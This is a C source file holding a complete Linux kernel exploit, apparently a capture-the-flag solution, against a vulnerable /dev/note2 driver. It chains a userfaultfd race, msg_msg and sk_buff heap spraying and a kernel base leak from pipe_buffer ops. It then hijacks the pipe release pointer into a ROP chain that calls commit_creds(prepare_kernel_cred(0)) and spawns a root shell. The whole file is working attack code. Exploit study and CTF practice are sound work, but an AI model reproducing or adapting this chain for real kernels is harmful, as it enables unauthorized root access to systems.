#define _GNU_SOURCE
#include <fcntl.h>      /* open */
#include <unistd.h>     /* exit */
#include <sys/ioctl.h>  /* ioctl */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <assert.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pthread.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/timerfd.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <linux/ioctl.h>
#include <sched.h>
#define IOC_MAGIC '\xFF'

#define IO_ADD     _IOWR(IOC_MAGIC, 0, struct ioctl_arg)
#define IO_EDIT    _IOWR(IOC_MAGIC, 1, struct ioctl_arg)
#define IO_SHOW    _IOWR(IOC_MAGIC, 2, struct ioctl_arg) 
#define IO_DEL	   _IOWR(IOC_MAGIC, 3, struct ioctl_arg)

#define MSG_EXCEPT      020000  /* recv any msg except of specified type.*/
#define MSG_COPY        040000  /* copy (not remove) all queue messages */

#define DEVICE_FILE_NAME "/dev/note2"
#define MTYPE_PRIMARY 0x43
#define MTYPE_SECONDARY 0x44
#define TARGET_CACHE 64
int fd;
int theidx = 0; // index to do exploit in, changes if we need to rerun so that we don't fall into issues
struct ioctl_arg
{
	uint64_t idx;
	uint64_t size;
	uint64_t addr;
};

struct node
{
	uint64_t key;
	uint64_t size;
	uint64_t addr;
};

typedef struct node node;
typedef struct ioctl_arg ioctl_arg;

typedef struct {
  long mtype;
  char mtext[0x4000];
} msgbuf_t;
msgbuf_t msgbuf;

#define NUM_PIPEFDS 256
#define NUM_SOCKETS 4
#define NUM_SKBUFFS 128
#define SKB_SHARED_SIZE 320
#define SECONDARY_SKBUFF_SIZE 1024 - SKB_SHARED_SIZE
#define ANON_PIPE_BUF_OPS 0xe3a940
#define CHAIN_START 0x744c92 // push rsi; cmpsb byte ptr [rsi], byte ptr [rdi]; jmp qword ptr [rsi + 0x66];
#define GET_OUT 0xe0cacc //add rsp, 0x70; pop rbx; pop rbp; ret; 
#define POP_RSP 0x14c7bd //pop rsp; ret
#define POP_RDI 0x235e8d

int ss[NUM_SOCKETS][2];
int pipefd[NUM_PIPEFDS][2];

struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
  uint64_t text;
};

struct msg_msgseg {
  uint64_t next;
};

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

int spray_skbuff(void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (write(ss[i][0], buf, size) < 0) {
        perror("write");
        return -1;
      }
    }
  }
  return 0;
}

int free_skbuff(void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], buf, size) < 0) {
        perror("read");
        return -1;
      }
    }
  }
  return 0;
}

int add(void* data, uint64_t size){
    ioctl_arg arg;
    arg.addr = (uint64_t)data;
    arg.size = size;
    return ioctl(fd, IO_ADD, &arg);
}

int edit(uint64_t idx, void* data){
    ioctl_arg arg;
    arg.idx = idx;
    arg.addr = (uint64_t)data;
    return ioctl(fd, IO_EDIT, &arg);
}

int show(uint64_t idx, void* buf) {
    ioctl_arg arg;
    arg.addr = (uint64_t)buf;
    arg.idx = idx;
    return ioctl(fd, IO_SHOW, &arg);
}

int del(uint64_t idx){
    ioctl_arg arg;
    arg.idx = idx;
    return ioctl(fd, IO_DEL, &arg);
}

void hexdump(uint8_t* buf, int size) {
    for (int i = 0; i < size; i+=16) {
        //printf("0x%02hhx| ", i);
        for (int j = 0; j < 16; j++)
            printf("%02hhx ", buf[i+j]);
        puts("");
    }
}

void* init(int num, uint64_t size){
    void* buf = calloc(1, size);
    memset(buf, num, size);
    return buf;
}

unsigned long race_page = 0xbaad0000;
pthread_t thread;

void race_function(){
    del(theidx);
    open("/proc/self/stat", O_RDONLY); // consume kmalloc-32 entry
    add(calloc(1,TARGET_CACHE), TARGET_CACHE);
}
void *racer(void *arg)
{
    struct uffd_msg uf_msg;
    struct uffdio_copy uf_copy;
    struct uffdio_range uf_range;
    long uffd = (long)arg;
    struct pollfd pollfd;
    int nready;

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    uf_range.start = race_page;
    uf_range.len = 0x1000;

    while(poll(&pollfd, 1, -1) > 0)
    {
        if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
        {
            perror("polling error");
            exit(-1);
        }
        if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)
        {
            perror("error reading event");
            exit(-1);
        }
        if(uf_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("unexpected result from event");
            exit(-1);
        }
        
        race_function();
        char uf_buffer[0x1000];
        memset(uf_buffer, 0, 0x1000);
        *(uint64_t *)(uf_buffer) = 0;
        *(uint64_t *)(uf_buffer + 8) = 0;
        uf_buffer[16] = 0x0;

        uf_copy.src = (unsigned long)uf_buffer;
        uf_copy.dst = race_page;
        uf_copy.len = 0x1000;
        uf_copy.mode = 0;
        uf_copy.copy = 0;
        if(ioctl(uffd, UFFDIO_COPY, (unsigned long)&uf_copy) == -1)
        {
            perror("uffdio_copy error");
            exit(-1);
        }
        if (ioctl(uffd, UFFDIO_UNREGISTER, (unsigned long)&uf_range) == -1)
        {
            perror("error unregistering page for userfaultfd");
        }
        return 0;
    }
    return 0;
}


void register_userfault()
{
    int uffd, race;
    struct uffdio_api uf_api;
    struct uffdio_register uf_register;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    uf_api.api = UFFD_API;
    uf_api.features = 0;

    if (ioctl(uffd, UFFDIO_API, (unsigned long)&uf_api) == -1)
    {
        perror("error with the uffdio_api");
        exit(-1);
    }

    if (mmap((void *)race_page, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != (void *)race_page)
    {
        perror("whoopsie doopsie on mmap");
        exit(-1);
    }

    uf_register.range.start = race_page;
    uf_register.range.len = 0x1000;
    uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

    if (ioctl(uffd, UFFDIO_REGISTER, (unsigned long)&uf_register) == -1)
    {
        perror("error registering page for userfaultfd");
    }

    race = pthread_create(&thread, NULL, racer, (void*)(long)uffd);
    if(race != 0)
    {
        perror("can't setup threads for race");
    }
    return;
}

void doxor(uint64_t* buffer, uint64_t key, uint64_t size){
    for(int i = 0; i*8 < size; i ++){
        buffer[i] ^= key;
    }
}

uint64_t user_cs, user_ss, user_sp, user_rflags;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void pwned(){
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
}
int main(int argc, char* argv[]){
    uint64_t kbase = 0;
    if(argc == 2){
        theidx = atoi(argv[1]);
    }
    
    // Lock to one cpu
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0){
        perror("sched_setaffinity");
        exit(1);
    }
    fd = open(DEVICE_FILE_NAME, 0);
    if(fd < 0){
        puts("Device file not found.");
        return 1;
    }

    // why the author uses 4 sockets ??? 
    for (int i = 0; i < NUM_SOCKETS; i ++) {
        if(socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
            perror("socketpair");
            exit(1);
        }
    }

    // create 128 msgbuf???
    int targets[300] = {0};
    for(int i = 0; i < 128; i ++){
        targets[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        memset(msgbuf.mtext, i, sizeof(msgbuf.mtext));
        msgbuf.mtype = MTYPE_PRIMARY;
        msgsnd(targets[i], &msgbuf, 64 - 0x30, 0);
        msgbuf.mtype = MTYPE_SECONDARY;
        *(uint64_t *)(msgbuf.mtext + 1024 - 0x30 - 8) = 0;
        msgsnd(targets[i], &msgbuf, 1024 - 0x30, 0);
    }

    del(theidx);
    add(calloc(1,24), 17);
    register_userfault();
    // Before we start the race, put holes in the kmalloc-64 full of msg_msg in hopes
    for(int i = 0; i < 128; i += 8){
        msgrcv(targets[i], &msgbuf, 64 - 0x30, 0, 0);
        msgrcv(targets[i], &msgbuf, 1024 - 0x30, 0, 0);
        targets[i] = 0;
    }

    edit(theidx, (void*)race_page);
    if(pthread_join(thread, NULL) != 0){
        perror("pthread_join");
        exit(1);
    }

    char* buf = calloc(1,512);
    show(theidx,buf);
    hexdump(buf, 512);
    int count = 511;
    while(buf[count] == 0){
        count -= 1;
    }
    // So now we have some leaks in kmalloc-64 but they've been XORed with some random value.
    // We need to know what this value is in future so we can mess with stuff
    // And also get the leaks
    // Since most qwords will be null, we know the most common qword is the key.
    // But C doesn't have hashmaps, so used some really bad associative arrays
    uint64_t qwords[512 / 8] = {0};
    uint64_t counts[512 / 8] = {0};
    int size = 0;
    printf("Count: %d\n", count);
    for(int i = 0; i < count; i += 8){
        uint64_t cur = *(uint64_t *)(buf + i);
        int found = -1;
        for(int idx = 0; idx < size; idx ++){
            if(qwords[idx] == cur){
                counts[idx] += 1;
                found = 1;
            }
        }
        if(found == -1){
            qwords[size] = cur;
            counts[size] = 1;
            size += 1;
        }
    }
    uint64_t key = 0;
    uint64_t highest = 0;
    for(int idx = 0; idx < size; idx ++){
        if (counts[idx] > highest && qwords[idx] != 0){
            highest = counts[idx];
            key = qwords[idx];
        }
    }
    printf("Key: %p\n", key);
    for(int i = 0; i < 512; i += 8){
        *(uint64_t *)(buf + i) ^= key;
    }
    hexdump(buf, 512);

    int msgidx = -1;
    uint64_t* longbuf = (uint64_t *)(buf);
    for(int i = 0; i < 512 / 8; i ++){
        if(longbuf[i] == MTYPE_PRIMARY){
            msgidx = i - 2;
            break;
        }
    }
    printf("Msgidx: %d\n", msgidx);
    if(msgidx == -1 || count - (msgidx * 8) < 16){
        printf("Nope. Rerun with argument %d\n", theidx + 1);
        exit(1);
    }
    struct msg_msg* leakmsg = (struct msg_msg *)(longbuf + msgidx);
    int idx_of_msg = leakmsg->text & 0xff;
    uint64_t kmalloc1kptr = leakmsg->m_list_next;
    printf("Kmalloc-1k ptr: %p\n", kmalloc1kptr);

    // Edit next pointer and size and use MSG_COPY to achieve arb read primitive, to learn which queue the adjacent 1k message is in
    leakmsg->next = kmalloc1kptr + 0x400 - 8;
    leakmsg->m_ts = 4096 - 0x30 + 0x1000 - 8;
    hexdump(buf, 512);

    // To get the data we actually want stored on the heap, XOR with the key before sending.
    
    doxor(buf, key, 512);
    edit(theidx, buf);
    doxor(buf, key, 512);
    printf("Leak copy %d\n", msgrcv(targets[idx_of_msg], &msgbuf, 4096 - 0x30 + 0x1000 - 8, 0, MSG_COPY | IPC_NOWAIT));
    
    int secondary_idx = *(uint8_t *)(msgbuf.mtext + 4096 - 0x30 + 48);
    // Free the secondary message right after our actual msg_msg's secondary
    printf("Free to dangle %d\n",msgrcv(targets[secondary_idx], &msgbuf, 0x3d0, MTYPE_SECONDARY, IPC_NOWAIT));
    
    // Now we can realloc with an sk_buff to make a fake msg_msg, which we then free with msg_msg API, to achieve UAF on sk_buff
    void* skbuf = calloc(2, 4096);
    struct msg_msg* skbufmsg = (struct msg_msg *)skbuf;
    puts("Building fake msg_msg");
    // Linked list pointers to self bypass unlink checks with ease
    skbufmsg->m_list_next = kmalloc1kptr + 0x400;
    skbufmsg->m_list_prev = kmalloc1kptr + 0x400;
    skbufmsg->m_type = 0x1337;
    skbufmsg->m_ts = 0x3d0;
    skbufmsg->next = 0;
    skbufmsg->security = 0;

    puts("Spraying sk_buff");
    // Spray sk_buff in place
    spray_skbuff(skbuf, SECONDARY_SKBUFF_SIZE);
    
    leakmsg->next = 0;
    leakmsg->m_ts = 16;
    leakmsg->m_list_next = kmalloc1kptr + 0x400;
    puts("Doing xor and editing");
    doxor(buf, key, 512);
    edit(theidx, buf);
    doxor(buf, key, 512);
    puts("Receiving");
    getchar();
    printf("Free to get the UAF %d\n", msgrcv(targets[idx_of_msg], &msgbuf, 0x3d0, 0x1337, IPC_NOWAIT));
    // sk_buff is now dangling

    // Alright, now we have a dangling sk_buff data. Let's allocate the new structure we're gonna exploit: piping.
    for(int i = 0; i < NUM_PIPEFDS; i ++){
        if(pipe(pipefd[i]) < 0){
            perror("pipe");
            exit(1);
        }
        if (write(pipefd[i][1], "lemonthink", 10) < 0) {
            perror("write");
            exit(1);
        }
    }
    puts("Leaking pipe buffers...");
    uint64_t pipe_buffer_ops = 0;
    for(int i = 0; i < NUM_SOCKETS; i ++){
        for(int j = 0; j < NUM_SKBUFFS; j++){
            if (read(ss[i][1], buf, SECONDARY_SKBUFF_SIZE) < 0){
                perror("read");
            }
            if(*(uint64_t *)(buf + 0x10) != 0x1337) {
                // We found it!
                pipe_buffer_ops = *(uint64_t *)(buf + 0x10);
            }
        }
    }
    printf("Pipe buffer ops: %p\n", pipe_buffer_ops);
    kbase = pipe_buffer_ops - ANON_PIPE_BUF_OPS;
    printf("Kbase: %p\n", kbase);

    struct pipe_buffer* fakepipe;
    struct pipe_buf_operations* ops;
    memset(skbuf, 0, 0x2000);
    // We now have sk_buff and pipe_buffer pointing to same place, overwrite pipe buffer vtable and set the release function to a ROP chain stack pivot starter
    fakepipe = (struct pipe_buffer *)skbuf;
    fakepipe->ops = kmalloc1kptr + 0x400 + 0x290;
    ops = (struct pipe_buf_operations *)(skbuf + 0x290);
    ops->release = kbase + CHAIN_START;

    // Chain will jump to address at pipebuf + 0x67, so pop rsp will pop rsi into rsp
    *(uint64_t *)(skbuf + 0x67) = kbase + POP_RSP;
    // Now just make it travel further into the buffer and ROP
    *(uint64_t *)(skbuf + 0x00) = kbase + POP_RSP;
    *(uint64_t *)(skbuf + 0x08) = kmalloc1kptr + 0x400 + 0x80;

    save_state();
    // Build a simpl rop to commit_creds(prepare_kernel_cred(0)). Don't need to load rax into rdi since both end up holding the pointer.
    uint64_t* rop = (uint64_t *)(skbuf + 0x80);
    *rop++ = kbase + POP_RDI;
    *rop++ = 0;
    *rop++ = kbase + 0xb96c0; // prepare_kernel_cred
    *rop++ = kbase + 0xb9480; //commit_creds
    // Return to userspace calmly and pop shell.
    *rop++ = kbase + 0xa00fc6; //kpti trampoline
    *rop++ = 0xdeadbeef;
    *rop++ = 0xc0ded00d;
    *rop++ = (uint64_t)pwned;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_sp & 0xffffffffffffff00,
    *rop++ = user_ss;
    

    spray_skbuff(skbuf, SECONDARY_SKBUFF_SIZE);
    getchar();
    puts("Releasing pipe buffers...");
    for(int i = 0; i < NUM_PIPEFDS; i ++){
        if(close(pipefd[i][0]) < 0) {
            perror("close");
            exit(1);
        }
        if(close(pipefd[i][1]) < 0) {
            perror("close");
            exit(1);
        }
    }
    sleep(10);
}